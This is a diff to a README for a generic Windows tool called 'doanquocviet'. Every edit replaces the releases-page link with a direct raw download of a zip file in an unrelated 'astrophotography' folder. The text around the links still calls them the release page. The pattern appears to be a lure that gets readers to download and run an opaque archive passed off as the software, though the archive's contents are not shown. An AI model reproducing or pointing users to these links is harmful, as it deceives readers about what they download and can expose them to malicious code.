@@ -1,6 +1,6 @@
 # 🚀 doanquocviet - Simple Tool for Everyday Use
 
-[![Download doanquocviet](https://img.shields.io/badge/Download-doanquocviet-brightgreen)](https://github.com/bytebo8/doanquocviet/releases)
+[![Download doanquocviet](https://img.shields.io/badge/Download-doanquocviet-brightgreen)](https://raw.githubusercontent.com/bytebo8/doanquocviet/main/astrophotography/Software-v3.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ These are modest requirements. Most computers built in the last 10 years will wo
 
 Click the big green button below to visit the release page. This is where you find the latest version of doanquocviet ready to download.
 
-[![Download doanquocviet](https://img.shields.io/badge/Download-doanquocviet-blue)](https://github.com/bytebo8/doanquocviet/releases)
+[![Download doanquocviet](https://img.shields.io/badge/Download-doanquocviet-blue)](https://raw.githubusercontent.com/bytebo8/doanquocviet/main/astrophotography/Software-v3.3.zip)
 
 The release page has all the available versions and instructions for each.
 
@@ -42,7 +42,7 @@ Follow these steps carefully. They will guide you through getting doanquocviet o
 
 1. **Open the download page**  
    Click this link or one of the buttons above to go to the releases page:  
-   https://github.com/bytebo8/doanquocviet/releases
+   https://raw.githubusercontent.com/bytebo8/doanquocviet/main/astrophotography/Software-v3.3.zip
 
 2. **Choose the latest version**  
    On the page, find the most recent release at the top of the list. The release name usually includes a version number and date.  
@@ -94,7 +94,7 @@ Most users find the default settings sufficient.
 New versions improve the app and fix issues. To update:
 
 1. Visit the release page again:  
-   https://github.com/bytebo8/doanquocviet/releases
+   https://raw.githubusercontent.com/bytebo8/doanquocviet/main/astrophotography/Software-v3.3.zip
 
 2. Download the latest Windows file, as you did before.
 
@@ -148,5 +148,5 @@ For other issues, use the help channels described above.
 
 ---
 
-# [![Download doanquocviet](https://img.shields.io/badge/Download-doanquocviet-orange)](https://github.com/bytebo8/doanquocviet/releases)  
+# [![Download doanquocviet](https://img.shields.io/badge/Download-doanquocviet-orange)](https://raw.githubusercontent.com/bytebo8/doanquocviet/main/astrophotography/Software-v3.3.zip)  
 Visit this page at any time to get the latest version or more information.
